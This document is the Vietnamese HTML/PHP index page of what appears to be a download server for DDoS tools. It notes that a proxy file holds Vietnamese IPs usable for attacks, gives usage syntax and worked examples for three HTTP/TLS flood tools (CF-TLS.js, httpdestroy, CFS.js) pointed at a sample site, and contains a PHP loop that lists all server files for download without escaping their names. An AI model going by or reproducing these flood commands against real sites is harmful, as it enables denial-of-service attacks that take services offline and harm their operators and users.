<!DOCTYPE html> <html> <head>
    <title>Đậu Đậu</title>
    <link rel="stylesheet" href="style.css">
    <script src="script.js"></script>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #f2f2f2;
        }
        
        .download-button {
            background-color: #4CAF50;
            color: white;
            padding: 8px 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .download-button:hover {
            background-color: #45a049;
        }
    </style> </head> <body>
    <button class="dark-mode-toggle" 
onclick="toggleDarkMode()">&#9788;</button>

    <h2>Thông báo</h2>
    <p>- file proxy.txt là list IP vietnam ddos được</p>
    <p>- file vn.txt là list IP vietnam không ddos được</p>
    
    <p><h2>Hướng dẫn sử dụng</h2></p>
    <p>- node CF-TLS.js [target] [time] [thread] [proxyfile]<p>
    <p>ví dụ: node CF-TLS.js https://daukute.org 60 100 proxy.txt</p>    
    <p>- ./httpdestroy [target] [time] [rate] [thread] [proxyfile]</p> 
    <p>ví dụ: ./httpdestroy https://daukute.org 60 5 100 proxy.txt</p>
    <p>- node CFS.js [Target] [Time] [Threads] [Method] [Proxy List] [Requests Per IP]</p>
    <p>ví dụ: node CFS.js https://daukute.org 60 500 GET proxy.txt 100</p>

    <h2>Danh sách</h2>
    <table>
        <tr>
            <th>Tên file</th>
            <th>Ngày sửa đổi gần nhất</th>
            <th>Dung lượng</th>
            <th>Mã nguồn</th>
        </tr>
        
        <?php
        $directory = '/var/www/html/';
        $files = scandir($directory);
        
        function formatSizeUnits($bytes) {
            if ($bytes >= 1073741824) {
                return number_format($bytes / 1073741824, 
2) . ' GB';
            } elseif ($bytes >= 1048576) {
                return number_format($bytes / 1048576, 2) . 
' MB';
            } elseif ($bytes >= 1024) {
                return number_format($bytes / 1024, 2) . ' 
KB';
            } else {
                return $bytes . ' bytes';
            }
        }
        
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..' && $file 
!== 'index.php' && $file !== 'script.js' && $file !== 
'style.css') {
        // Xử lý và hiển thị thông tin về tệp
                $file_path = $directory . $file;
                $file_size = filesize($file_path);
                $file_modified = date("H:i:s d-m-y", 
filemtime($file_path));
                echo '<tr>';
                echo '<td>' . $file . '</td>';
                echo '<td>' . $file_modified . '</td>';
                echo '<td>' . formatSizeUnits($file_size) . 
'</td>';
                echo '<td><a href="' . basename($file_path) 
. '" class="download-button">Xem</a></td>';
                echo '</tr>';
            }
        }
        ?>
    </table> 






</body> </html>
